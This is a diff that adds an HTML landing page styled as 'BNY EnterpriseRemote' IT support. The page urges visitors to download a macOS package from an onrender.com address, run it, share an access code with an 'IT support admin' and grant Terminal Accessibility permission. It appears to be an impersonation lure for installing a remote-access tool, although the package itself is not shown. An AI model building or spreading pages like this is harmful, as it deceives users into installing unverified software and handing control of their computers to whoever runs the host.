@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BNY EnterpriseRemote - Get Support</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 100%);
+            color: #f8f9fa;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+    <div style="width:100%;max-width:480px;padding:20px;">
+        <div style="background:#1a1a2e;border-radius:20px;padding:48px 40px;box-shadow:0 24px 80px rgba(0,0,0,0.6);border:1px solid rgba(255,255,255,0.08);text-align:center;">
+
+            <!-- Logo -->
+            <div style="margin-bottom:36px;">
+                <div style="font-size:52px;margin-bottom:16px;">🖥️</div>
+                <h1 style="font-size:26px;font-weight:700;margin-bottom:8px;">BNY <span style="color:#0066cc;">Enterprise</span>Remote</h1>
+                <p style="color:#6c757d;font-size:14px;">Request IT Technical Support</p>
+            </div>
+
+            <!-- Main download button -->
+            <a href="https://bny-enterpriseremote.onrender.com/client-agent/BNY-RemoteSupport.pkg"
+               id="dl-btn"
+               style="display:block;background:linear-gradient(135deg,#0066cc,#0052a3);color:white;text-decoration:none;
+                      padding:20px 32px;border-radius:14px;font-size:18px;font-weight:700;margin-bottom:12px;
+                      box-shadow:0 8px 32px rgba(0,102,204,0.4);transition:all 0.2s;">
+                ⬇️ Download Support Agent
+            </a>
+
+            <!-- macOS note -->
+            <p style="color:#6c757d;font-size:12px;margin-bottom:32px;">
+                macOS · Double-click the downloaded file to start
+            </p>
+
+            <!-- Divider -->
+            <div style="border-top:1px solid rgba(255,255,255,0.07);margin-bottom:28px;"></div>
+
+            <!-- Steps -->
+            <div style="text-align:left;display:flex;flex-direction:column;gap:14px;margin-bottom:28px;">
+                <div style="display:flex;align-items:center;gap:14px;">
+                    <div style="min-width:28px;height:28px;background:#0066cc;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;">1</div>
+                    <span style="font-size:14px;color:#d0d0d0;">Click <strong>Download Support Agent</strong> above</span>
+                </div>
+                <div style="display:flex;align-items:center;gap:14px;">
+                    <div style="min-width:28px;height:28px;background:#0066cc;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;">2</div>
+                    <span style="font-size:14px;color:#d0d0d0;"><strong>Double-click</strong> the downloaded <code style="background:rgba(255,255,255,0.1);padding:1px 6px;border-radius:4px;">BNY-RemoteSupport.pkg</code> file</span>
+                </div>
+                <div style="display:flex;align-items:center;gap:14px;">
+                    <div style="min-width:28px;height:28px;background:#0066cc;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;">3</div>
+                    <span style="font-size:14px;color:#d0d0d0;">An <strong>8-digit access code</strong> will appear automatically</span>
+                </div>
+                <div style="display:flex;align-items:center;gap:14px;">
+                    <div style="min-width:28px;height:28px;background:#0066cc;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;">4</div>
+                    <span style="font-size:14px;color:#d0d0d0;"><strong>Share the code</strong> with your IT support admin</span>
+                </div>
+            </div>
+
+            <!-- macOS Permissions note -->
+            <div style="background:rgba(255,193,7,0.1);border:1px solid rgba(255,193,7,0.4);border-radius:10px;padding:14px;text-align:left;">
+                <p style="color:#ffc107;font-size:12px;margin-bottom:4px;font-weight:600;">⚠️ macOS Permission Required (first run only)</p>
+                <p style="color:#aaa;font-size:11px;">System Preferences → Security &amp; Privacy → Accessibility → allow Terminal</p>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('dl-btn').addEventListener('mouseover', function() {
+            this.style.transform = 'translateY(-3px)';
+            this.style.boxShadow = '0 12px 40px rgba(0,102,204,0.5)';
+        });
+        document.getElementById('dl-btn').addEventListener('mouseout', function() {
+            this.style.transform = '';
+            this.style.boxShadow = '0 8px 32px rgba(0,102,204,0.4)';
+        });
+    </script>
+</body>
+</html>
